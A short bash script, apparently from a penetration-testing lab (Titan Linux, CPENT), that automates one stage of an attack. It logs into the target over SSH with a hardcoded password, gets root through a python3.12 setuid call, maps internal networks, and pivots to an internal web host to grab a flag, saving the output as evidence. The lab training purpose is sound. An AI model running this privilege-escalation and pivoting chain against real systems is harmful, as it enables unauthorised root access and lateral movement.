#!/bin/bash
cd "/home/chifay/Whoami-Labs/Titan Linux" || exit 1
SSH="sshpass -p password123 ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no ubuntu@192.168.60.132"
clear
printf '\033]0;TITAN VECTOR 4 REDES\007'
echo "=================================================================="
echo " TITAN LINUX - VECTOR 4: SUBREDES INTERNAS OCULTAS Y PIVOTING"
echo " Fecha: $(date)"
echo "=================================================================="
echo
echo '$ python3.12 -c "os.setuid(0); os.system(\"ip -4 -br addr; ip route\")"'
$SSH 'python3.12 -c "import os; os.setuid(0); os.system(\"ip -4 -br addr; echo; ip route\")"' 2>&1 | tee "evidencias/term_vector4_redes.txt"
echo
echo '$ curl -s http://10.10.50.1:8080 | grep -E "TitanCorp|CPENT"'
$SSH 'python3.12 -c "import os; os.setuid(0); os.system(\"curl -s --max-time 8 http://10.10.50.1:8080 | grep -E \\\"TitanCorp|CPENT\\\"\")"' 2>&1 | tee "evidencias/term_vector4_flag_pivot.txt"
echo
echo "### FIN ETAPA 4 ###"
touch /tmp/opencode/stage4.done
sleep 3600
